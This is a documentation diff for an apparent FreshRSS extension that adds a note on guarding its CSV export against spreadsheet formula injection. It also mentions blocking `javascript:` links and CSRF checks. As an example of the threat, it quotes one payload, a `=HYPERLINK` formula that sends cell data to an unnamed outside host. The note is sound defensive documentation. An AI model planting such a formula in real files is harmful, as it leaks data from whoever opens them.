@@ -129,6 +129,14 @@ A feed decides what an article's link is, so that link is untrusted input.
 * **Only `http:` and `https:` entries become links** on the history page.
   Anything else — a `javascript:` link a feed managed to smuggle in — is shown
   as plain text instead.
+* **The CSV export cannot carry a spreadsheet formula.** Excel and LibreOffice
+  evaluate a cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage
+  return, so a headline of `=HYPERLINK("http://…"&A1)` would run the moment the
+  downloaded file is opened. The four columns a feed controls — title, URL, feed
+  name, category name — get a leading single quote in that case, which is the
+  escape both applications understand: the cell stays text and the quote is not
+  part of it. Escaping only those four is deliberate; the remaining columns are
+  the extension's own id, status and timestamps.
 * **Requests are protected against CSRF by FreshRSS itself**: it rejects any
   POST without a valid token before a controller is reached, and extensions are
   not on its exemption list.
